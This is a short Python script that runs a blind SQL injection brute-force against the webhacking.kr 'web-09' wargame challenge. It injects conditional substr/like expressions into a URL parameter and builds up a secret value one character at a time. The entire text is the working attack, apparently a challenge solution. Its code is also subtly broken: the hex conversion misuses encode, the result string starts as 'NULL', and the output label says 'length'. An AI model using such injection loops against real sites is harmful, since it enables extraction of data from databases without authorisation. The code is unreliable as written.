import requests
import encodings


pw="NULL"
for i in range(1,12):
    for j in range(56,127):
        url = 'https://webhacking.kr/challenge/web-09/?no=if(substr(id,'+str(i)+")like(0x"+chr(j).encode(hex(j))+"),3,0)"
    
        response = requests.get(url)
        if(response.text.find('Secret')!= -1):
                pw += chr(j)
                print("id's length is "+pw)



                
                
